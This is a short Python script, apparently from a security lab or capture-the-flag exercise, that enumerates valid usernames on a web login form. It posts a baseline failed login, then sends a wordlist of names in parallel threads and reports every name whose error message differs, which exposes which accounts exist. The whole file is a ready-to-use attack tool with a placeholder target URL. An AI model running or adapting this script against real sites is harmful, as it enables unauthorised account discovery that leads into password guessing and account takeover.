from bs4 import BeautifulSoup
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "hhttps://YOUR-LINK/login"
wordlist_path = "authentication/wordlist/usernames.txt"
# Number of concurrent threads : higher means faster enumeration
num_of_workers = 10

with open(wordlist_path) as wordlist_file:
    usernames = wordlist_file.read().splitlines()

# Parse the warning message from the login form's error response
# TODO: update soup.find() tag and class_ to match the target site's error element
def extract_warning(response):
    soup = BeautifulSoup(response.text, "html.parser")
    warning = soup.find("p", class_="is-warning")
    return warning.get_text(strip=False) if warning else None

# Baseline POST — fingerprints a guaranteed failed auth warning message
baseline_response = requests.post(url, data={"username": "dummy_username", "password": "dummy_password"})
baseline_message = extract_warning(baseline_response)
print(f"[*] Baseline message: '{baseline_message}'\n")

warnings = {}

def check_username(username):
    response = requests.post(url, data={"username": username, "password": "dummy_password"})
    message = extract_warning(response)
    return username, message

with ThreadPoolExecutor(max_workers=num_of_workers) as executor:
    # Dispatch all usernames to the pool simultaneously
    futures = {executor.submit(check_username, username): username for username in usernames}
    # Iterate results in completion order, not submission order
    for future in as_completed(futures):
        username, message = future.result()
        warnings[username] = message
        print(f"[*] {username:<30} | {message}")

print("\n[+] Unique warnings found:")
for username, message in warnings.items():
    if message != baseline_message:
        print(f"Username: '{username}' -> '{message}'")